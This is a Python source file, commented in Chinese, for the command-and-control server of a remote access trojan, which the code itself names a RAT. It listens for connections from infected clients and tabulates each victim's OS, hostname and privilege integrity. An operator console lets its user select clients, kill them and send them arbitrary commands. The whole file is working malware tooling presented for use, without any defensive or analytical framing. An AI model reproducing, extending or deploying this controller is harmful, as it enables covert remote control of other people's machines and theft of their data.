import json
import socket
import subprocess
import sys
import threading
import time

from core.protocol.ratsocket import RATSocket
from core.utils.logger import logger
from core.utils.common_util import parse, print_table
from server.commands.alias_manager import AliasManager
from server.commands.executor import CommandExecutor
from server.config.config import SOCKET_ADDR
from core.utils.server_util import *
from server.connection.client_connection import ClientConnection
from server.connection.connection_manager import ConnectionManager


class Server:

    def __init__(self, address):
        """
        初始化服务器对象
        :param address: 服务器地址
        """
        self.address = address
        self.socket = RATSocket()
        self.connections = ConnectionManager()
        self.alias_manager = AliasManager()

    def serve(self):
        """
        接受新连接的线程
        """
        try:
            self.socket.bind(self.address)  # 绑定服务器地址
            logger.info('Listening on port {}'.format(self.address[1]))
        except Exception as e:
            logger.error('Error binding socket: {}'.format(e))

        while 1:
            try:
                conn, addr = self.socket.accept()  # 接受新连接
                conn.settimeout(5)  # 设置超时时间
                try:
                    connection = ClientConnection(conn)  # 创建客户端实例
                    info = connection.recv()  # 接收客户端信息
                except json.JSONDecodeError:
                    conn.close()
                    logger.error('Connection timed out: {}'.format(addr))
                    continue
                except Exception as e:
                    logger.error('Error establishing connection: {}'.format(e))
                    continue
                conn.settimeout(None)
                info = {**{'addr': f'{addr[0]}:{addr[1]}'}, **info}  # 更新客户端信息
                connection = ClientConnection(conn, addr, info)
                self.connections.add(connection)  # 将连接添加到连接列表
                logger.info('Connection has been established: {}'.format(addr))
                threading.Thread(target=self.connection_handler, args=(connection,), daemon=True).start()  # 启动新线程处理连接
            except socket.error as e:
                logger.error(e)

    def connection_handler(self, conn):
        """
        处理接收的子线程
        :param conn: 连接
        """
        while 1:
            try:
                conn.recv_message()
            except socket.error:
                logger.error(f'Connection closed: {conn.address}')
                conn.message_queue.put_status(0)
                self.connections.remove(conn)
                break
            except:
                logger.error(f'Error receiving from {conn.address}', exc_info=True)
                time.sleep(1)

    def list_connections(self):
        """
        显示连接列表
        """
        if not self.connections.list():
            print("No active connections at present")
            return

        # 准备表头和数据
        headers = ['ID', 'Address', 'OS', 'OS Version', 'Hostname', 'Integrity']
        data = [
            [
                str(i),  # ID
                conn.info.get('addr', 'N/A'),
                conn.info.get('os_type', 'Unknown'),
                conn.info.get('os_ver', 'Unknown'),
                conn.info.get('hostname', 'Unknown'),
                conn.info.get('integrity', '?')
            ]
            for i, conn in enumerate(self.connections.list())
        ]

        # 使用通用方法打印表格
        print_table(headers, data)
        
    def get_last_connection(self) -> ClientConnection:
        """
        获取最新连接
        :return: 连接
        """
        try:
            return self.connections.last()
        except IndexError:
            raise Exception('No connection at this time')

    def get_target_connection(self, id) -> ClientConnection:
        """
        根据id获取连接
        :param id: 连接id
        :return: 连接
        """
        try:
            return self.connections[int(id)]
        except (ValueError, IndexError):
            raise Exception('Not a valid selection')

    def kill_connection(self, id):
        """
        关闭连接
        :param id: 连接id
        """
        conn = self.get_target_connection(id)
        if conn:
            conn.send_command('kill')

    def open_connection(self, conn: ClientConnection):
        """
        与连接交互
        :param conn: 连接
        """
        print('[+] Connected to {}'.format(conn.address))
        conn.is_interactive = True  # 设置连接为交互中
        while not conn.message_queue.empty():  # 连接前判断有没有未读消息
            logger.info('[UNREAD] ' + conn.message_queue.get()[1])
        command_executor = CommandExecutor(conn, self)
        try:
            while 1:
                try:
                    cmd = colored_input('{}> '.format(conn.info['cwd']))
                    if not cmd.strip():
                        continue
                        # 关闭连接
                    if cmd in ['kill', 'reset']:
                        conn.send_command(cmd)
                        break
                    # 搁置连接
                    elif cmd in ['exit', 'quit']:
                        break
                    # 切换至最新连接
                    elif cmd == 'q':
                        connection = self.get_last_connection()
                        if connection == conn:
                            continue
                        self.open_connection(connection)
                        break
                    func = command_executor.process_command(cmd)
                    if func:
                        for i in func():
                            write(*i)
                except Exception as e:
                    print_error(f'{e.__class__.__name__}: {e}')
        except socket.error:
            print_error('[-] Connection closed')
        except KeyboardInterrupt:
            print(Colors.RESET)
            time.sleep(0.1)
        except Exception as e:
            print_error(f'{e.__class__.__name__}: {e}')
        conn.is_interactive = False

    def cmdloop(self):
        """
        命令行交互
        """
        while 1:
            try:
                cmd = colored_input('flc> ')
                if not cmd.strip():
                    continue
                name, arg = parse(cmd)
                # 查看所有连接
                if cmd in ['l', 'ls', 'list']:
                    self.list_connections()
                # 与最新客户端交互
                elif cmd == 'q':
                    self.open_connection(self.get_last_connection())
                # 与指定客户端交互
                elif name in ['s', 'select']:
                    self.open_connection(self.get_target_connection(arg))
                # 关闭连接
                elif name in ['k', 'kill']:
                    self.kill_connection(arg)
                # 退出
                elif cmd in ['quit', 'exit']:
                    server.socket.close()
                    sys.exit(0)
                # 清屏
                elif cmd in ['cls', 'clear']:
                    subprocess.call(cmd, shell=True)
                # 切换目录
                elif name == 'cd':
                    print(cd(arg))
                # 与指定客户端交互
                else:
                    try:
                        self.open_connection(self.get_target_connection(cmd))
                    except Exception:
                        raise Exception('Command not recognized')
            except KeyboardInterrupt:
                print(Colors.RESET)
                server.socket.close()
                sys.exit(0)
            except Exception as e:
                write(0, f'[-] {type(e).__name__}: {e}')
            finally:
                print()


if __name__ == '__main__':
    os.system('')  # 初始化颜色显示
    server = Server(SOCKET_ADDR)
    threading.Thread(target=server.serve, daemon=True).start()
    server.cmdloop()

